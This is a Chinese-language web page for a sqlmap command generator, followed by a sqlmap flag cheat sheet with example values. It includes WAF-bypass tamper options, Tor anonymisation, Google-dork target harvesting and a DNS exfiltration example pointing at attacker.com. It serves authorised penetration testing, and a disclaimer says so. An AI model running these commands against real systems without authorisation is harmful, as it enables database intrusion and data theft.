sqlmap Generator

貼入 HTTP request，自動產生 sqlmap 指令。

01 HTTP Request

貼入從 Burp 或 DevTools 複製的原始 request。

支援 GET / POST；JSON body 或 application/x-www-form-urlencoded 皆可自動識別。
02 注入設定

指定注入點、資料庫類型與掃描強度。

POST JSON 會自動在值後加 * 標記。
未選 = 不帶入 --technique，交由 sqlmap 預設（BEUSTQ）。
03 進階選項

選擇要附加的開關、繞過 WAF 的 tamper 與目標動作。

--batch 為非互動模式；--forms 會自動解析並測試頁面表單；-o 等同開啟 keep-alive、null-connection、predict-output；--skip-waf 跳過 WAF 偵測。
目前動作：僅偵測注入點（無額外列舉參數）。
執行方式

sqlmap 官方無 Windows 執行檔，屬純 Python 工具。Kali 或以 apt / pip 安裝時可直接用 sqlmap；從原始碼執行則需 python sqlmap.py（Windows）或 python3 sqlmap.py（Linux/macOS）。切換平台會自動帶入建議值。

填了會以「執行方式 + 此路徑」開頭（例：python C:\Tools\sqlmap\sqlmap.py），指令即可在任何目錄執行；留空則只用執行方式本身。若執行方式選 sqlmap（套件版），此欄會被忽略。
指令格式
sqlmap command Linux / macOS

此工具僅供已取得授權的安全測試使用。請勿對未經授權的目標進行掃描。

sqlmap 速查表

Target 目標

-u, --url 指定目標 URL -u "https://ex.com/page.php?id=1"
-r REQUESTFILE 從檔案載入 HTTP 請求 -r request.txt
-l LOGFILE 從 Burp/WebScarab proxy 日誌解析目標 -l proxy.log
-m BULKFILE 從文字檔掃描多個目標 -m targets.txt
-g GOOGLEDORK 以 Google Dork 結果為目標 -g "inurl:php?id="
-d DIRECT 直接連線資料庫的連線字串 -d "mysql://root:pw@localhost/db"
-c CONFIGFILE 從 INI 設定檔載入選項 -c config.ini

Request 請求

--data=DATA 透過 POST 送出的資料字串 --data="id=1"
--cookie=COOKIE HTTP Cookie 標頭值 --cookie="PHPSESSID=abc"
--method=METHOD 強制指定 HTTP 方法 --method=PUT
-A, --user-agent 指定 User-Agent 標頭 --user-agent="Mozilla/5.0"
--random-agent 隨機挑選 User-Agent --random-agent
--mobile 模擬行動裝置 User-Agent --mobile
--referer 指定 Referer 標頭 --referer=https://google.com/
-H, --header 附加單一標頭 --header="X-Forwarded-For: 127.0.0.1"
--headers 附加多個標頭 --headers="Accept-Language: fr\nETag: 1"
--proxy=PROXY 使用 proxy 連線目標 --proxy=http://127.0.0.1:8080
--proxy-cred proxy 認證帳密 --proxy-cred=user:pass
--tor 使用 Tor 匿名網路 --tor
--tor-type 設定 Tor proxy 類型 --tor-type=SOCKS5
--check-tor 檢查 Tor 是否正確使用 --check-tor
--delay=DELAY 每次請求間延遲秒數 --delay=2
--timeout=TIMEOUT 連線逾時秒數（預設 30） --timeout=60
--retries=RETRIES 逾時重試次數（預設 3） --retries=5
--csrf-token 保存 anti-CSRF token 的參數 --csrf-token=csrf_token
--csrf-url 取得 anti-CSRF token 的 URL --csrf-url=https://ex.com/login
--auth-type / --auth-cred HTTP 驗證類型與帳密 --auth-type=Basic --auth-cred=a:b
--force-ssl 強制使用 SSL/HTTPS --force-ssl
--ignore-code 忽略指定 HTTP 錯誤碼 --ignore-code=401
--ignore-redirects 忽略重新導向 --ignore-redirects

Optimization 優化

-o 啟用所有優化開關 -o
--threads=THREADS 最大同時請求數（上限 10） --threads=5
--keep-alive 使用持久連線 --keep-alive
--null-connection 只取頁面長度不取內容 --null-connection
--predict-output 預測常見查詢輸出 --predict-output

Injection 注入

-p TESTPARAMETER 指定要測試的參數 -p id
--skip=SKIP 跳過指定參數 --skip=password
--param-filter 依位置選擇測試參數 --param-filter=GET
--dbms=DBMS 強制指定後端 DBMS --dbms=mysql
--os=OS 強制指定後端作業系統 --os=Linux
--prefix / --suffix payload 前綴 / 後綴 --prefix="'" --suffix="#"
--tamper=TAMPER 使用 tamper 腳本改寫 payload --tamper=space2comment
--technique=TECH 指定注入技術（預設 BEUSTQ） --technique=BEU
--time-sec=TIMESEC 延遲盲注回應秒數（預設 5） --time-sec=10
--union-cols=UCOLS UNION 注入測試欄位範圍 --union-cols=1-10

Detection 偵測

--level=LEVEL 測試級別 1–5（預設 1） --level=3
--risk=RISK 風險等級 1–3（預設 1） --risk=2
--string=STRING 結果為真時要匹配的字串 --string="Welcome"
--not-string 結果為假時要匹配的字串 --not-string="denied"
--regexp=REGEXP 結果為真時匹配的正則 --regexp="(true|1)"
--code=CODE 結果為真時匹配的 HTTP 狀態碼 --code=200
--smart 僅在有正向啟發時徹底測試 --smart
--text-only / --titles 僅比較文字內容 / 頁面標題 --text-only

Techniques 技術

--technique=TECH SQL 注入技術（B/E/U/S/T/Q） --technique=U
--time-sec DBMS 回應延遲秒數 --time-sec=10
--union-cols / --union-char UNION 欄位範圍 / 測試字元 --union-char=^
--union-from UNION 查詢 FROM 的表名 --union-from=users
--dns-domain DNS 外洩攻擊用網域 --dns-domain=attacker.com
--second-url / --second-req 二次注入結果頁 / 請求檔 --second-url=https://ex.com/x

Fingerprint 指紋
